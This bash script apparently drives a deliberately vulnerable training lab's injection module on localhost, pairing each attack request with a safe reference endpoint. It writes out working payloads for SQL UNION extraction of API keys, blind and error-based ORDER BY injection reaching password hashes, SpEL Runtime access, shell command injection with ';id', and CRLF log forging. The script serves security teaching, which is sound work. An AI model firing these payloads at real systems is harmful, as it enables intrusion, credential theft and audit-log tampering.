#!/usr/bin/env bash
# Checklist section 5 — injection.  Target: m05-injection (8085)
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib.sh"
PORT=8085
banner "05 · injection: SQL, LIKE, ORDER BY, SpEL, command, log forging (port ${PORT})"
up "${PORT}" m05-injection

# -----------------------------------------------------------------------------------------------
title "1. SQL injection through JDBC string concatenation"
req GET "${PORT}" "/vuln5/subscriptions?email=alice@example.invalid"
note "Boolean-based bypass: the WHERE clause is neutralised, every row comes back."
req GET "${PORT}" "/vuln5/subscriptions?email=x'%20OR%20'1'='1"
note "UNION against a table the application user can read (see integration_credentials in data.sql)."
req GET "${PORT}" "/vuln5/subscriptions?email=x'%20UNION%20SELECT%20service_name,env,api_key,1%20FROM%20integration_credentials%20--"
note "Reference implementation binds the value and validates its shape first:"
req GET "${PORT}" "/safe5/subscriptions?email=x'%20OR%20'1'='1"
req GET "${PORT}" "/safe5/subscriptions?email=alice@example.invalid"

# -----------------------------------------------------------------------------------------------
title "2. LIKE wildcards are not escaped"
req GET "${PORT}" "/vuln5/search?q=%25"
note "'%' as the search term matches every row: data leak plus a full table scan (cheap DoS)."
req GET "${PORT}" "/safe5/search?q=%25"
note "Reference implementation escapes %, _ and the escape character, then binds with ESCAPE '\\'."

# -----------------------------------------------------------------------------------------------
title "3. ORDER BY injection (identifiers cannot be parameterised)"
req GET "${PORT}" "/vuln5/list?sort=id&dir=asc"
note "Blind extraction: a CASE expression decides the sort order, the response differs by condition."
req GET "${PORT}" "/vuln5/list?sort=CASE%20WHEN%20(1=1)%20THEN%20id%20ELSE%20plan%20END&dir=asc"
note "Error-based: the DB error text is returned, which discloses the schema."
req GET "${PORT}" "/vuln5/list?sort=(SELECT%20password_hash%20FROM%20subscriber)&dir=asc"
note "Reference implementation resolves the identifier from an allow-list:"
req GET "${PORT}" "/safe5/list?sort=(SELECT%201)&dir=asc"
req GET "${PORT}" "/safe5/list?sort=plan&dir=desc"

# -----------------------------------------------------------------------------------------------
title "4. JPQL and native queries built by concatenation"
req GET "${PORT}" "/vuln5/jpa?plan=ESPD-BASIC"
req GET "${PORT}" "/vuln5/jpa?plan=x'%20OR%20'1'='1"
req GET "${PORT}" "/vuln5/native?tenantId=T-100"
req GET "${PORT}" "/vuln5/native?tenantId=x'%20OR%20'1'='1"
note "'It is not raw SQL, so it is safe' is false for JPQL too."
req GET "${PORT}" "/safe5/jpa?plan=ESPD-BASIC&tenantId=T-100"
req GET "${PORT}" "/safe5/jpa?plan=x'%20OR%20'1'='1&tenantId=T-100"

# -----------------------------------------------------------------------------------------------
title "5. SpEL injection: user input reaching the expression parser"
note "Default mode is a read-only context: property access leaks object structure, not code."
req GET "${PORT}" "/vuln5/report?expr=plan"
req GET "${PORT}" "/vuln5/report?expr=tenantId.length()"
note "Set VULNRANGE_ALLOW_SPEL_TYPES=true to see the unsandboxed shape (type references enabled)."
note "That mode is code execution by definition, so it is opt-in and documented, never the default."
note "Reference implementation: request selects a template key from a registry."
req GET "${PORT}" "/safe5/report?template=priceWithVat"
req GET "${PORT}" "/safe5/report?template=T(java.lang.Runtime).getRuntime()"

# -----------------------------------------------------------------------------------------------
title "6. OS command injection (shell-composed command)"
note "This sink is disabled unless VULNRANGE_ALLOW_EXEC=true, because running it is arbitrary"
note "command execution on the host and the range must not ship that switched on."
req POST "${PORT}" "/vuln5/tools/ping?host=127.0.0.1%3Bid" "" application/x-www-form-urlencoded
echo "  start the module with VULNRANGE_ALLOW_EXEC=true to see the concatenated 'sh -c' sink execute."
note "Reference implementation: validate the host, resolve it, pass it as a single argv element."
req POST "${PORT}" "/safe5/tools/ping?host=127.0.0.1%3Bid" "" application/x-www-form-urlencoded

# -----------------------------------------------------------------------------------------------
title "7. Log forging via CRLF (audit-trail integrity)"
FORGED='login ok user=alice%0A2026-10-30 INFO  payment ok user=attacker amount=0.00'
req POST "${PORT}" "/vuln5/audit/message?message=${FORGED}" "" application/x-www-form-urlencoded
note "Two log lines for one request: a forged 'payment ok' entry is now in the audit index."
req POST "${PORT}" "/safe5/audit/message?message=${FORGED}" "" application/x-www-form-urlencoded
note "Reference implementation strips CR/LF/NUL and bounds the length before logging."
echo
banner "done · details and fixes: docs/05-injection.md"
